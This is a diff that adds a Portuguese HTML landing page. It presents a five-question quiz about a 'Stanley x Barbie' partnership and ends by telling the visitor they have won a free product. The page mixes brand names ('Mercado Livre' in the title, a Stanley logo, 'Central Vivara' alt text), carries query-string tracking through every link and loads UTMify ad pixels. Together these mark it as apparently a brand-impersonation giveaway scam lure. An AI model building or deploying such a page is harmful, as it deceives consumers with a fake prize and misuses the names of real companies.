@@ -1,0 +1,218 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="css/fonts.css">
+
+    <link rel="icon" href="images/favico.jpg" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="images/favico.jpg">
+
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200">
+    <title>Mercado Livre</title>
+    <script src="js/latest.js" data-utmify-prevent-subids="" data-utmify-fast-start="" async="" defer=""></script>
+    <script>
+        function onLoad() {
+            var links = document.getElementsByTagName("a");
+
+            for (var i = 0, n = links.length; i < n; i++) {
+            if (links[i].href.includes("#")) {
+                continue;
+            }
+
+            var href =
+                links[i].href.trim() +
+                (links[i].href.indexOf("?") > 0 ? "&" : "?") +
+                document.location.search.replace("?", "").toString();
+            links[i].href = href;
+            }
+        }
+
+        document.addEventListener("DOMContentLoaded", onLoad);
+    </script>
+
+<script async="" defer="" src="js/pixel.js"></script></head>
+<body>
+
+
+
+
+    <nav class="navbar" style="padding-top: 15px; margin-bottom: 5px;">
+        <div class="menu-icon" style="padding-left: 3%;">
+            <img src="images/logo_stanley.jpeg" style="height: 5vh;" alt="Logo Central Vivara">
+        </div>
+
+        <div class="logo-central">
+        </div>
+
+        <div class="menu-icon" style="padding-right: 3%;">
+            <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 10px; color: black">menu</span>
+        </div>
+    </nav>
+    
+
+    <div class="pergunta"> 
+
+        <!--------------------- Barra de progresso --------------------->
+
+        <div style="padding-bottom: 20px;"></div>
+
+        <div id="respondaeganhe" class="respondaeganhe">
+            <p style="font-family: 'GellixSemiBold';">Responda e ganhe!</p>
+        </div>
+
+        <div id="barradeprogresso" class="container" style="padding-bottom: 5px;">
+            <div class="progress-bar-container">
+                <div class="progress-bar">
+                    <div class="progress" id="progress"></div>
+                </div>
+                <div class="progress-text" id="progress-text">20%</div>
+            </div>
+        </div>
+
+
+        <!--------------------- Pergunta 1 --------------------->
+
+        <div id="p1">
+
+            <img src="images/quiz1.png" style="width: 90%; display: flex; margin: 0 auto; border-radius: 15px;">
+
+            <p class="pergunta_title">Quem é o namorado famoso da Barbie?</p>
+
+            <ul class="quiz-options">
+                <li><button>Ken</button></li>
+                <li><button>Mike</button></li>
+                <li><button>Não sei</button></li>
+                <li><button>Nenhum desses</button></li>
+            </ul>
+
+        </div>
+
+        <!--------------------- Pergunta 2 --------------------->
+
+        <div id="p2" style="display: none">
+            <img src="images/quiz2.png" style="width: 90%; display: flex; margin: 0 auto; border-radius: 15px;">
+            <p class="pergunta_title">O que você achou do filme da Barbie lançado?</p>
+            <ul class="quiz-options">
+                <li><button>Gostei muito!</button></li>
+                <li><button>Achei bom!</button></li>
+                <li><button>Não gostei.</button></li>
+                <li><button>Não assisti!</button></li>
+            </ul>
+        </div>
+
+        <!--------------------- Pergunta 3 --------------------->
+
+        <div id="p3" style="display: none">
+            <img src="images/quiz3.png" style="width: 90%; display: flex; margin: 0 auto; border-radius: 15px;">
+            <p class="pergunta_title">Aonde você viu a parceria da Stanley x Barbie?</p>
+            <ul class="quiz-options">
+                <li><button>Pelo instagram</button></li>
+                <li><button>Pelo Tiktok</button></li>
+                <li><button>Pelo Facebook</button></li>
+                <li><button>Outro lugar</button></li>
+            </ul>
+        </div>
+
+        <!--------------------- Pergunta 4 --------------------->
+
+        <div id="p4" style="display: none">
+            <img src="images/quiz4.png" style="width: 90%; display: flex; margin: 0 auto; border-radius: 15px;">
+            <p class="pergunta_title">Você ja tinha ouvido falar da parceria com a Barbie e Stanley?</p>
+            <ul class="quiz-options">
+                <li><button>Sim, ja tinha ouvido falar</button></li>
+                <li><button>Ouvi falar mas não sei do que se trata</button></li>
+                <li><button>Não, nunca ouvi falar</button></li>
+                <li><button>Talvez escutei mas não me lembro
+                </button></li>
+            </ul>
+        </div>
+
+        <!--------------------- Pergunta 5 --------------------->
+
+        <div id="p5" style="display: none">
+            <img src="images/quiz5.png" style="width: 90%; display: flex; margin: 0 auto; border-radius: 15px;">
+            <p class="pergunta_title">Você ja possui um copo Stanley?</p>
+            <ul class="quiz-options">
+                <li><button>Sim, 1 copo</button></li>
+                <li><button>Sim, 2 copos</button></li>
+                <li><button>Sim, 3 ou mais copos</button></li>
+                <li><button>Ainda não tenho nenhum copo stanley</button></li>
+            </ul>
+        </div>
+
+
+
+
+        <!--------------------- Receber de Graça --------------------->
+
+        <div id="p6" style="display: none">
+        <div class="respondaeganhe">
+            <p style="font-family: 'GellixSemiBold';">Parabéns!</p>
+        </div>
+
+          <img src="images/quiz6.png" style="width: 90%; display: flex; margin: 0 auto; border-radius: 15px;">
+          
+
+          <p style="padding: 25px;">
+            Como forma de agradecimento, você ganhou <strong>uma super oferta podendo escolher 1 produto de graça da "Stanley x Barbie"!</strong>
+
+            <br><br>
+            Esperamos que você aproveite ao máximo seu copo e que ele tragam ainda mais diversão para você e sua família.
+            <br><br>
+            Com carinho,<br> Equipe Stanley x Barbie!
+          </p>
+      </div>
+
+
+
+
+
+        <!--------------------- Botão de seguir --------------------->
+    
+        <div class="question-container">
+                <div class="question" id="question1" style="display:none;"></div>
+                <div class="question" id="question2" style="display:none;"></div>
+                <div class="question" id="question3" style="display:none;"></div>
+                <div class="question" id="question4" style="display:none;"></div>
+                <div class="question" id="question5" style="display:none;"></div>
+                <div class="question" id="question6" style="display:none;"></div>
+        </div>
+
+        <div style="padding-bottom: 10px;"></div>
+    
+        <button class="next-button" id="next-button" onclick="nextQuestion()">Próximo</button>
+        
+        <div style="padding-bottom: 20px;"></div>
+
+        
+    </div>
+
+    
+
+
+    <script src="js/scripts.js"></script>
+
+
+
+
+    <script>
+        document.querySelectorAll('.quiz-options button').forEach(button => {
+            button.addEventListener('click', () => {
+                document.querySelectorAll('.quiz-options button').forEach(btn => btn.style.borderColor = '#ccc');
+                button.style.borderColor = '#FB67A4';
+                button.style.backgroundColor = '#DBE2FF';
+            });
+        });
+    </script>
+
+<script>
+  window.pixelId = "66fe1ca64500e59685c625d1";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+
+</body></html>
